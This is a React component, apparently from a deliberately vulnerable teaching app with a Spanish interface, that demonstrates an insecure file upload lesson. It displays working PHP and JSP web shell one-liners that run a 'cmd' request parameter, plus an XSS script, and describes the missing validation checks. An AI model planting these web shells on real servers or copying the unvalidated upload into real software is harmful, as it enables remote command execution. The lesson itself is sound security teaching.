import React, { useState, ChangeEvent } from 'react';
import apiService from '../../services/api';
import { UploadResponse } from '../../types';

interface MaliciousExample {
  name: string;
  content: string;
}

const FileUpload: React.FC = () => {
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [uploadResult, setUploadResult] = useState<UploadResponse | null>(null);
  const [error, setError] = useState<string>('');

  const handleFileChange = (e: ChangeEvent<HTMLInputElement>): void => {
    if (e.target.files && e.target.files[0]) {
      setSelectedFile(e.target.files[0]);
    }
  };

  const handleUpload = async (): Promise<void> => {
    if (!selectedFile) {
      setError('Por favor selecciona un archivo');
      return;
    }

    try {
      const response = await apiService.uploadFile(selectedFile);
      setUploadResult(response);
      setError('');
    } catch (error: any) {
      setError(error.response?.data?.error || 'Error al subir el archivo');
      setUploadResult(null);
    }
  };

  const maliciousExamples: MaliciousExample[] = [
    {
      name: 'shell.php',
      content: '<?php system($_GET["cmd"]); ?>'
    },
    {
      name: 'webshell.jsp',
      content: '<%@ page import="java.util.*,java.io.*"%>\n<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
    },
    {
      name: 'malicious.html',
      content: '<script>alert("XSS")</script>'
    }
  ];

  const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000';

  return (
    <div className="vulnerability-section">
      <h2>Insecure File Upload</h2>
      
      <div className="alert alert-info">
        <strong>Vulnerabilidad:</strong> El servidor no valida el tipo, contenido, ni tamaño 
        de los archivos subidos. Permite subir cualquier archivo con cualquier extensión.
      </div>

      <div className="file-upload-section">
        <div className="form-group">
          <label>Seleccionar archivo:</label>
          <input 
            type="file" 
            onChange={handleFileChange}
          />
        </div>

        <button onClick={handleUpload} className="btn btn-primary">
          Subir Archivo
        </button>

        {error && (
          <div className="alert alert-danger" style={{ marginTop: '10px' }}>
            {error}
          </div>
        )}

        {uploadResult && (
          <div className="alert alert-success" style={{ marginTop: '10px' }}>
            <strong>Archivo subido:</strong><br />
            Nombre: {uploadResult.filename}<br />
            Ruta: <a href={`${API_URL}${uploadResult.path}`} target="_blank" rel="noopener noreferrer">
              {uploadResult.path}
            </a>
          </div>
        )}
      </div>

      <div style={{ marginTop: '30px' }}>
        <h3>Ejemplos de archivos maliciosos:</h3>
        {maliciousExamples.map((example, index) => (
          <div key={index} style={{ marginBottom: '15px' }}>
            <strong>{example.name}:</strong>
            <pre style={{ fontSize: '12px' }}>{example.content}</pre>
          </div>
        ))}
      </div>

      <div className="alert alert-danger" style={{ marginTop: '20px' }}>
        <strong>Impacto:</strong> Un atacante puede subir scripts maliciosos (webshells), 
        archivos ejecutables, o contenido malicioso que puede comprometer el servidor o 
        afectar a otros usuarios.
      </div>

      <div className="alert alert-info" style={{ marginTop: '10px' }}>
        <strong>Problemas detectados:</strong>
        <ul style={{ textAlign: 'left', marginTop: '10px' }}>
          <li>No valida la extensión del archivo</li>
          <li>No valida el contenido (MIME type)</li>
          <li>No hay límite de tamaño</li>
          <li>Los archivos son accesibles directamente</li>
          <li>Se mantiene el nombre original del archivo</li>
        </ul>
      </div>
    </div>
  );
};

export default FileUpload;
